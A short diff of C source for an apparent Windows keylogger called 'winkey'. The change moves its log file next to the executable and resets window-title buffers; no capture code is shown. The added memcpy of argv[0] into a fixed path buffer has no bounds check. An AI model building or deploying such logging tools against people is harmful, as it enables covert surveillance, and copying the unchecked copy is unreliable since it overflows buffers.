@@ -2,12 +2,15 @@
 
 t_winkey	g_winkey;
 
-int			main(void)
+int			main(int ac, char *av[])
 {
 	MSG			msg;
 
-	/* trunc file */
-	fopen_s(&g_winkey.stream, "winkey.log", "w" );
+	if (ac != 1)
+		return (1);
+	memcpy(g_winkey.path, av[0], strlen(av[0]) + 1);
+	memcpy(strrchr(g_winkey.path, '\\') + 1, LOG_FILE, strlen(LOG_FILE) + 1);
+	fopen_s(&g_winkey.stream, g_winkey.path, "w" );
 	fclose(g_winkey.stream);
 	memset(g_winkey.window_title, 0, sizeof(g_winkey.window_title));
 	memset(g_winkey.window_prev, 0, sizeof(g_winkey.window_prev));
